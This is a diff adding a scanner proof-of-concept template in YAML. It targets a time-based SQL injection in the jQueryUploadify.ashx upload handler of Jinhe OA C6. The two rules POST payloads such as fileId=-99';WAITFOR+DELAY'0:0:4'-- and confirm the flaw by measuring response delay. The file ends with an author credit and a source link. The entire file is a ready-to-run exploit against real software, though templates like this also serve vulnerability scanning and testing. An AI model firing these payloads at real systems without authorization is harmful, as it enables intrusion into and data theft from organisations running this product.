@@ -1,0 +1,30 @@
+name: poc-yaml-jinheOA-C6-jQueryUploadify.ashx-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: type=delete&fileId=-99';WAITFOR+DELAY'0:0:4'--
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: type=delete&fileId=-99';WAITFOR+DELAY'0:0:8'--
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487120&idx=1&sn=c372077148e423ac9168b500718453c7&chksm=c267bba3f51032b59c082fa29ebcdf299431fdc3fbdec6f9fd00e6cc08d237e59b862fef0752&token=101124693&lang=zh_CN#rd
